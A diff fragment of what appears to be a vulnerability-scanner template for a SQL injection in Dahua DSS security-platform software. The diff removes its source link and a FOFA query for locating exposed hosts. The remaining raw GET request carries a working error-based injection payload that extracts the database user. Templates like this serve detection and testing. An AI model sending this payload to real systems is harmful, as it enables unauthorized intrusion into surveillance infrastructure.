@@ -3,12 +3,8 @@ info:
   name: 大华DSS城市安防系统clearTempFile SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rfazpztzwhgi2l11'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rfazpztzwhgi2l11
-    fofa: body="/portal/include/script/dahuaDefined/headCommon.js?type=index"&&title="DSS"
 http:
 - raw:
   - 'GET /portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,user(),0x7e))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1 HTTP/1.1
